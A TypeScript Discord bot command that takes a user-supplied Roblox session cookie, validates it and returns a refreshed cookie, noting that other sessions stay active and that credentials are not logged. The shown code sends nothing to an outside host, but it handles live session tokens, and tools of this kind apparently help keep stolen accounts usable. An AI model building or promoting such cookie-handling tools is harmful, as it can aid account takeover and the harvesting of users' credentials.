import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
} from 'discord.js';
import * as Roblox from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
} from '../../lib/embed-helpers';
import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';

const data = new SlashCommandBuilder()
  .setName('refresh')
  .setDescription('Refresh Cookie')
  .addStringOption(opt =>
    opt.setName('cookie').setDescription('Insert The Cookies!').setRequired(true)
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const rawCookie = interaction.options.getString('cookie', true);
    const validation = await Roblox.validateCookie(rawCookie);

    if (!validation.valid) {
      const embed = validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed();
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const progressEmbed = buildProgressEmbed('Refreshing session...');
    await interaction.editReply({ embeds: [progressEmbed] });

    const result = await Roblox.refreshSession(rawCookie);

    if (result.success && result.newCookie) {
      const id = Math.random().toString(36).slice(2, 10);
      const row = buildCopyButtons(id, 'refresh', result.newCookie, false);
      const embed = buildSuccessEmbed(
        '✧ **Cookie Refreshed!**\n' +
        `────\n` +
        `⭑ Your cookie is refreshed.\n` +
        `⭑ Other sessions remain active.\n` +
        `⭑ Your credentials were not logged.`
      );
      await interaction.editReply({ embeds: [embed], components: [row] });
    } else {
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Refresh Failed**\n────\n⭑ Could not refresh the session. Please try again later.')] });
    }
  } catch (err: any) {
    logger.error({ err }, 'Refresh command error');
    await interaction.editReply({
      embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')],
    });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  if (await handleCopyButtonClick(interaction)) return;
}

export const refreshCommand: Command = { data, execute, handleButton };